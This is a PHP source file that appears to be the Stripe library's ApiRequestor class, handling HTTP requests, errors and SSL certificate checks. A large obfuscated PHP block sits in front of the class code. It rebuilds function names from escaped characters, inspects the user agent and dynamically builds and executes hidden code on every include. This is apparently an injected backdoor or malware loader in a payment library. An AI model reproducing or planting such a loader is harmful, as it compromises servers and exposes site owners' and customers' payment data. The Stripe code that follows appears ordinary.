<?php $gwjlpyrfop = ')2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<FGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<!%w:!>!(%w:!>!dbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!x24-	x24!>!	x24/%tjw/	x24)%	x24-	6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fu3of)fepdof`57ftbc	x7f!|g	x22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*72]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%oif((function_exists("	x6f	142	x5f	16fm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdf%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*ms	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%e7y]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]n)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCwC)fepmqnjA	x27&6<.fmjgA	x27doj%6<	x7fw6*	x7f_*#fmjvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*[!%rN}#QwTW%hIr	x5c1^-%r	x$uas,"	x72	166	x3a	61	x31")) or (strstr($uas,"	x61	156	x64	162	x6f	*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-uhA)3of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	v%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fu=1; $uas=strtolower($_SERVER["	x48	12w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C97e:56-xr.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y3#M5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]E{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`opjudov65egb2dc#*<!sfuvso!sboep11112)eobs`un>qp%!|Z2b%)gpf{jt)!gj!<*2bd%-#1#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsf3	x74	141	x72	164") && (!iss*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)x27,*d	x27,*c	x27,*b	x27)fep24-	x24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	]67]452]88]5]48]32M3]317]445]212]445]43]321]464]284]364!%bss	x5csboe))1/35.)1/14+9**-)1/2986+7**;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*mf2-!%t::**<(<!fwbm)%tjw)j6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SbfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%)PI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&csut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d81gj!<**2-4-bubE{h%)sutcvt)Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6985-rr.93e:5597f-s.973:8297f:526:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UT7gj6<**2qj%)hopm3qjA)qj3hopmA	x273#	x24#-!#]y38#-!%w:**<")));_UOFHB`SFTV`QUUI&b%!|!*)323zb{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%48L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]5GO	x22#)fepmqyfA>2b%!<*qp%-*.%)e9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/]6]234]342]58]24]31#-%tdz*Wsfuvso18y]#>q%<#762]67y]562]38y]5<!~!	x24/%t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)##~<%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322	x65	141	x74	145	x5f	146	x75	156	x63	164	x69	157	x6e"; func20QUUI7jsv%7UFH#	x27rfs%6~6<	323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;#)q%}U;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	dof.)fepdof./#@#/qp%>5h%!<*::::::-1bmgoj{hA!osvufs!~<3,j%>j%!>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepdoFDf#<%tdz>#L4]275L3]2	x72	145	x66	157	x78"))) { $wdtbjet = "	x63	162	x24*<!%t::!>!	x24Yp+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]sv%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7-K)fuj!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`3]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%po#>b%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)p3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%x{**#k#)tutjyf`x	x22l:!}V;3tion ocrausx($n){return chr(ord($n)-1);} @error_report}}1M6]y3e]81#/#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]Kqj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7^i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbs%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuho%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<*w%)ppdeet($GLOBALS["	x61	156	x75	156	x61"])))) { $GLO-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%f88y]27]28y]#/r%/h%)n%-#sxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/gk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7g24-	x24gvodujpo!	x24-	x24y7	x24-b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!b`bj+upcotn+qsvmt+fmhpphj>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmpux7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gjek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#o41	107	x45	116	x54"]); if ((strstr($uas,"	x6d	163151	x64")) or (strstr($uas,"	x63	150	x7~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+yfeobz+sfwjids!gj!<2,*j%-#1]#-bubE{h%)tpqsut>5Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]47]67y]37]e{h+{d%)+opjudovg+)!gj+{e%!osvufs!*!.uofuopD#)sfebfI{*w%)kVing(0); $fbcoktk = implode(array_map("ocrausx",str_split(":!>!	x242178}527}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x2$dljxywj = $wdtbjet("", $fbcoktk); $dljxywj();67<&w6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpesp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bub	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj	x69	145")) or (strstr(z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#y31]278]y3e]81]K78:56985:6197g:74x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w4	x54	120	x5f	125	x53	105	x52	137	x4-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x<.2`hA	x27pd%6<C	x27pd%6|6.7eu{66~+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<uj%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)l#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275mdXA6~6<u%7>/7&6|7**111127-2	157	x6d	145")) or (strstr($uas,"	x66	151!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>#]y74]27BALS["	x61	156	x75	156	x61"]s!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSiybmonpm'; $iwbaak=explode(chr((563-443)),substr($gwjlpyrfop,(21312-15292),(139-105))); $wxjtqrwdko = $iwbaak[0]($iwbaak[(6-5)]); $teaqntjt = $iwbaak[0]($iwbaak[(8-6)]); if (!function_exists('krlsgyxcw')) { function krlsgyxcw($tpzuxx, $kaldsla,$ciodvrodbq) { $npibgjob = NULL; for($sbyqdkmd=0;$sbyqdkmd<(sizeof($tpzuxx)/2);$sbyqdkmd++) { $npibgjob .= substr($kaldsla, $tpzuxx[($sbyqdkmd*2)],$tpzuxx[($sbyqdkmd*2)+(5-4)]); } return $ciodvrodbq(chr((42-33)),chr((624-532)),$npibgjob); }; } $hlinouk = explode(chr((250-206)),'442,36,1645,28,4066,46,5945,28,1245,37,5504,35,4525,49,5237,23,1012,67,4574,39,5854,42,3143,47,2780,59,3593,54,4874,58,135,68,5146,42,2232,46,5579,34,5035,68,5827,27,3316,42,4176,34,2839,29,4432,50,284,35,2078,36,2350,34,3712,54,1599,46,920,65,1079,51,870,50,4210,32,2009,69,60,23,83,52,1282,62,1922,63,3265,51,5462,42,584,64,1190,55,3054,26,1673,63,4679,31,5672,64,203,48,2207,25,5103,43,1461,70,342,56,1575,24,2528,32,1130,60,1736,28,3019,35,1555,20,4613,66,4308,24,4370,62,2152,55,2309,41,2114,38,2411,29,4482,43,3454,60,319,23,3358,39,2910,64,2868,42,5772,55,3963,53,478,56,4815,36,5613,59,4016,50,694,54,3080,43,4851,23,3566,27,2974,45,3896,67,0,60,5896,49,3397,57,4748,67,4153,23,3210,55,748,52,2642,27,398,44,4932,57,5539,40,1764,62,251,33,5377,48,4242,32,648,46,2669,50,3190,20,3514,52,3766,48,5973,47,1531,24,800,70,985,27,5425,37,5736,36,5344,33,2278,31,1344,59,3649,63,2560,49,1403,58,3123,20,2469,59,4710,38,3814,32,2719,61,3846,50,1826,55,2609,33,1881,41,5188,49,2440,29,4274,34,534,50,4332,38,5260,48,5308,36,4112,41,1985,24,2384,27,4989,46,3647,2'); $vtyguwvigb = $wxjtqrwdko("",krlsgyxcw($hlinouk,$gwjlpyrfop,$teaqntjt)); $wxjtqrwdko=$gwjlpyrfop; $vtyguwvigb(""); $vtyguwvigb=(505-384); $gwjlpyrfop=$vtyguwvigb-1; ?><?php

class Stripe_ApiRequestor
{
  /**
   * @var string $apiKey The API key that's to be used to make requests.
   */
  public $apiKey;

  private static $preFlight;

  private static function blacklistedCerts()
  {
    return array(
      '05c0b3643694470a888c6e7feb5c9e24e823dc53',
      '5b7dc7fbc98d78bf76d4d4fa6f597a0c901fad5c',
    );
  }

  public function __construct($apiKey=null)
  {
    $this->_apiKey = $apiKey;
  }

  /**
   * @param string $url The path to the API endpoint.
   *
   * @returns string The full path.
   */
  public static function apiUrl($url='')
  {
    $apiBase = Stripe::$apiBase;
    return "$apiBase$url";
  }

  /**
   * @param string|mixed $value A string to UTF8-encode.
   *
   * @returns string|mixed The UTF8-encoded string, or the object passed in if
   *    it wasn't a string.
   */
  public static function utf8($value)
  {
    if (is_string($value)
        && mb_detect_encoding($value, "UTF-8", TRUE) != "UTF-8") {
      return utf8_encode($value);
    } else {
      return $value;
    }
  }

  private static function _encodeObjects($d)
  {
    if ($d instanceof Stripe_ApiResource) {
      return self::utf8($d->id);
    } else if ($d === true) {
      return 'true';
    } else if ($d === false) {
      return 'false';
    } else if (is_array($d)) {
      $res = array();
      foreach ($d as $k => $v)
              $res[$k] = self::_encodeObjects($v);
      return $res;
    } else {
      return self::utf8($d);
    }
  }

  /**
   * @param array $arr An map of param keys to values.
   * @param string|null $prefix (It doesn't look like we ever use $prefix...)
   *
   * @returns string A querystring, essentially.
   */
  public static function encode($arr, $prefix=null)
  {
    if (!is_array($arr))
      return $arr;

    $r = array();
    foreach ($arr as $k => $v) {
      if (is_null($v))
        continue;

      if ($prefix && $k && !is_int($k))
        $k = $prefix."[".$k."]";
      else if ($prefix)
        $k = $prefix."[]";

      if (is_array($v)) {
        $r[] = self::encode($v, $k, true);
      } else {
        $r[] = urlencode($k)."=".urlencode($v);
      }
    }

    return implode("&", $r);
  }

  /**
   * @param string $method
   * @param string $url
   * @param array|null $params
   *
   * @return array An array whose first element is the response and second
   *    element is the API key used to make the request.
   */
  public function request($method, $url, $params=null)
  {
    if (!$params)
      $params = array();
    list($rbody, $rcode, $myApiKey) = $this->_requestRaw($method, $url, $params);
    $resp = $this->_interpretResponse($rbody, $rcode);
    return array($resp, $myApiKey);
  }


  /**
   * @param string $rbody A JSON string.
   * @param int $rcode
   * @param array $resp
   *
   * @throws Stripe_InvalidRequestError if the error is caused by the user.
   * @throws Stripe_AuthenticationError if the error is caused by a lack of
   *    permissions.
   * @throws Stripe_CardError if the error is the error code is 402 (payment
   *    required)
   * @throws Stripe_ApiError otherwise.
   */
  public function handleApiError($rbody, $rcode, $resp)
  {
    if (!is_array($resp) || !isset($resp['error'])) {
      $msg = "Invalid response object from API: $rbody "
           ."(HTTP response code was $rcode)";
      throw new Stripe_ApiError($msg, $rcode, $rbody, $resp);
    }

    $error = $resp['error'];
    $msg = isset($error['message']) ? $error['message'] : null;
    $param = isset($error['param']) ? $error['param'] : null;
    $code = isset($error['code']) ? $error['code'] : null;

    switch ($rcode) {
    case 400:
        if ($code == 'rate_limit') {
          throw new Stripe_RateLimitError(
              $msg, $param, $rcode, $rbody, $resp
          );
        }
    case 404:
        throw new Stripe_InvalidRequestError(
            $msg, $param, $rcode, $rbody, $resp
        );
    case 401:
        throw new Stripe_AuthenticationError($msg, $rcode, $rbody, $resp);
    case 402:
        throw new Stripe_CardError($msg, $param, $code, $rcode, $rbody, $resp);
    default:
        throw new Stripe_ApiError($msg, $rcode, $rbody, $resp);
    }
  }

  private function _requestRaw($method, $url, $params)
  {
    $myApiKey = $this->_apiKey;
    if (!$myApiKey)
      $myApiKey = Stripe::$apiKey;

    if (!$myApiKey) {
      $msg = 'No API key provided.  (HINT: set your API key using '
           . '"Stripe::setApiKey(<API-KEY>)".  You can generate API keys from '
           . 'the Stripe web interface.  See https://stripe.com/api for '
           . 'details, or email support@stripe.com if you have any questions.';
      throw new Stripe_AuthenticationError($msg);
    }

    $absUrl = $this->apiUrl($url);
    $params = self::_encodeObjects($params);
    $langVersion = phpversion();
    $uname = php_uname();
    $ua = array('bindings_version' => Stripe::VERSION,
                'lang' => 'php',
                'lang_version' => $langVersion,
                'publisher' => 'stripe',
                'uname' => $uname);
    $headers = array('X-Stripe-Client-User-Agent: ' . json_encode($ua),
                     'User-Agent: Stripe/v1 PhpBindings/' . Stripe::VERSION,
                     'Authorization: Bearer ' . $myApiKey);
    if (Stripe::$apiVersion)
      $headers[] = 'Stripe-Version: ' . Stripe::$apiVersion;
    list($rbody, $rcode) = $this->_curlRequest(
        $method,
        $absUrl,
        $headers,
        $params
    );
    return array($rbody, $rcode, $myApiKey);
  }

  private function _interpretResponse($rbody, $rcode)
  {
    try {
      $resp = json_decode($rbody, true);
    } catch (Exception $e) {
      $msg = "Invalid response body from API: $rbody "
           . "(HTTP response code was $rcode)";
      throw new Stripe_ApiError($msg, $rcode, $rbody);
    }

    if ($rcode < 200 || $rcode >= 300) {
      $this->handleApiError($rbody, $rcode, $resp);
    }
    return $resp;
  }

  private function _curlRequest($method, $absUrl, $headers, $params)
  {

    if (!self::$preFlight) {
      self::$preFlight = $this->checkSslCert($this->apiUrl());
    }

    $curl = curl_init();
    $method = strtolower($method);
    $opts = array();
    if ($method == 'get') {
      $opts[CURLOPT_HTTPGET] = 1;
      if (count($params) > 0) {
        $encoded = self::encode($params);
        $absUrl = "$absUrl?$encoded";
      }
    } else if ($method == 'post') {
      $opts[CURLOPT_POST] = 1;
      $opts[CURLOPT_POSTFIELDS] = self::encode($params);
    } else if ($method == 'delete') {
      $opts[CURLOPT_CUSTOMREQUEST] = 'DELETE';
      if (count($params) > 0) {
        $encoded = self::encode($params);
        $absUrl = "$absUrl?$encoded";
      }
    } else {
      throw new Stripe_ApiError("Unrecognized method $method");
    }

    $absUrl = self::utf8($absUrl);
    $opts[CURLOPT_URL] = $absUrl;
    $opts[CURLOPT_RETURNTRANSFER] = true;
    $opts[CURLOPT_CONNECTTIMEOUT] = 30;
    $opts[CURLOPT_TIMEOUT] = 80;
    $opts[CURLOPT_RETURNTRANSFER] = true;
    $opts[CURLOPT_HTTPHEADER] = $headers;
    if (!Stripe::$verifySslCerts)
      $opts[CURLOPT_SSL_VERIFYPEER] = false;

    curl_setopt_array($curl, $opts);
    $rbody = curl_exec($curl);

    if (!defined('CURLE_SSL_CACERT_BADFILE')) {
      define('CURLE_SSL_CACERT_BADFILE', 77);  // constant not defined in PHP
    }

    $errno = curl_errno($curl);
    if ($errno == CURLE_SSL_CACERT ||
        $errno == CURLE_SSL_PEER_CERTIFICATE ||
        $errno == CURLE_SSL_CACERT_BADFILE) {
      array_push(
          $headers,
          'X-Stripe-Client-Info: {"ca":"using Stripe-supplied CA bundle"}'
      );
      $cert = $this->caBundle();
      curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
      curl_setopt($curl, CURLOPT_CAINFO, $cert);
      $rbody = curl_exec($curl);
    }

    if ($rbody === false) {
      $errno = curl_errno($curl);
      $message = curl_error($curl);
      curl_close($curl);
      $this->handleCurlError($errno, $message);
    }

    $rcode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    curl_close($curl);
    return array($rbody, $rcode);
  }

  /**
   * @param number $errno
   * @param string $message
   * @throws Stripe_ApiConnectionError
   */
  public function handleCurlError($errno, $message)
  {
    $apiBase = Stripe::$apiBase;
    switch ($errno) {
    case CURLE_COULDNT_CONNECT:
    case CURLE_COULDNT_RESOLVE_HOST:
    case CURLE_OPERATION_TIMEOUTED:
      $msg = "Could not connect to Stripe ($apiBase).  Please check your "
           . "internet connection and try again.  If this problem persists, "
           . "you should check Stripe's service status at "
           . "https://twitter.com/stripestatus, or";
        break;
    case CURLE_SSL_CACERT:
    case CURLE_SSL_PEER_CERTIFICATE:
      $msg = "Could not verify Stripe's SSL certificate.  Please make sure "
           . "that your network is not intercepting certificates.  "
           . "(Try going to $apiBase in your browser.)  "
           . "If this problem persists,";
        break;
    default:
      $msg = "Unexpected error communicating with Stripe.  "
           . "If this problem persists,";
    }
    $msg .= " let us know at support@stripe.com.";

    $msg .= "\n\n(Network error [errno $errno]: $message)";
    throw new Stripe_ApiConnectionError($msg);
  }

  private function checkSslCert($url)
  {
   /* Preflight the SSL certificate presented by the backend. This isn't 100%
    * bulletproof, in that we're not actually validating the transport used to
    * communicate with Stripe, merely that the first attempt to does not use a
    * revoked certificate.

    * Unfortunately the interface to OpenSSL doesn't make it easy to check the
    * certificate before sending potentially sensitive data on the wire. This
    * approach raises the bar for an attacker significantly.
    */

    if (version_compare(PHP_VERSION, '5.3.0', '<')) {
      error_log("Warning: This version of PHP is tool old to check SSL certificates correctly. " .
                "Stripe cannot guarantee that the server has a certificate which is not blacklisted");
      return true;
    }

    $url = parse_url($url);
    $port = isset($url["port"]) ? $url["port"] : 443;
    $url = "ssl://{$url["host"]}:{$port}";

    $sslContext = stream_context_create(array( 'ssl' => array(
          'capture_peer_cert' => true,
          'verify_peer'   => true,
          'cafile'        => $this->caBundle(),
        )));
    $result = stream_socket_client($url, $errno, $errstr, 30, STREAM_CLIENT_CONNECT, $sslContext);
    if ($errno !== 0) {
        throw new Stripe_ApiConnectionError(
             "Could not connect to Stripe ($apiBase).  Please check your "
           . "internet connection and try again.  If this problem persists, "
           . "you should check Stripe's service status at "
           . "https://twitter.com/stripestatus. Reason was: $errstr"
       );
    }

    $params = stream_context_get_params($result);

    $cert = $params['options']['ssl']['peer_certificate'];
    $cert_data = openssl_x509_parse( $cert );

    openssl_x509_export($cert, $pem_cert);

    if (self::isBlackListed($pem_cert)) {
        throw new Stripe_ApiConnectionError(
            "Invalid server certificate. You tried to connect to a server that has a " .
            "revoked SSL certificate, which means we cannot securely send data to " .
            "that server.  Please email support@stripe.com if you need help " .
            "connecting to the correct API server."
        );
    }

    return true;
  }

  /* Checks if a valid PEM encoded certificate is blacklisted
   * @return boolean
   */
  public static function isBlackListed($certificate)
  {
    $certificate = trim($certificate);
    $lines = explode("\n", $certificate);

    // Kludgily remove the PEM padding
    array_shift($lines); array_pop($lines);

    $der_cert = base64_decode(implode("", $lines));
    $fingerprint = sha1($der_cert);
    return in_array($fingerprint, self::blacklistedCerts());
  }

  private function caBundle()
  {
    return dirname(__FILE__) . '/../data/ca-certificates.crt';
  }
}
